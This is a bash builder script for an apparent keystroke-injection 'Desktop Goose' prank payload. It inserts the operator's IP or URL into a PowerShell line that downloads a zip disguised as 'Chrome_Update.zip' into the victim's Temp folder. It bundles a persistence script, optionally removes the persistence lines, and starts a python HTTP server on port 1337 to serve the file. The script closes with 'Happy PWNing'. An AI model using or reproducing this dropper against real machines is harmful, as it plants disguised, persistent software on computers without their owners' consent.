#!/bin/bash

#Determine the source of the DesktopGoose download
echo "1) Local Webserver | 2) Persistant URL"

read -p "Select a download source [1/2]: " DL

if [ "${DL}" == "1" ];
then
	echo "Grabbing your IP"

	#Grab your local IP to add to the payload
	SRC="$(ip route show | grep default | cut -d ' ' -f 9)"
	
	#Add your IP to the payload
	sed -i "s/YOUR_IP/$SRC/" GooseDropper.txt
	
	sleep 5s && clear

elif [ "${DL}" == "2" ];
then
	#Get your URL
	read -p "Enter your URL: " SRC

	#Add your URL to the payload
	sed -i "s/powershell wget YOUR_IP:1337\/Chrome_Update.zip -OutFile \$ENV:Temp\/Updater.zip/powershell \"wget \'$SRC\' -OutFile \$ENV:Temp\/Updater.zip\"/" GooseDropper.txt
	
	#Remind users to have the zip ready
	echo "Please ensure a ZIP file with proper contents and formatting is hosted at the provided URL"

	sleep 5s && clear

else
	echo "Please enter a valid selection"
	exit

fi

#Check if Desktop Goose is present in this directory
GOOSE="$(ls | grep 'Desktop Goose v0.31.zip')"

if [ "${GOOSE}" == "" ];
then
	echo "Desktop Goose is not present in this directory, download it, or move it here"
	exit

else
	unzip "Desktop Goose v0.31.zip"
	mv "Desktop Goose v0.31/DesktopGoose v0.31" Update
	mv PersistentGoose.ps1 Update/
	zip -r Chrome_Update.zip Update
	rm -rf "Desktop Goose v0.31"* Update
	clear
fi

read -p "Configure Persistence? [Y/N]: " PERSIST

if [ "${PERSIST,,}" == "n" ];
then
	sed -i "15d;16d;17d;18d;19d" GooseDropper.txt
else
	break
fi

if [ "${DL}" == "1" ];
then
	clear
	read -p "Configuration finished! Start python webserver now? [Y/N]: " START
	clear
else
	clear
	break
fi

if [ "${START,,}" == "y" ];
then
	echo "Starting Server... Happy PWNing! (don't be a skid)"
	python3 -m http.server 1337 && echo "PWNED!"
else
	clear
	echo "Finished... Happy PWNing (don't be a skid)!"
fi
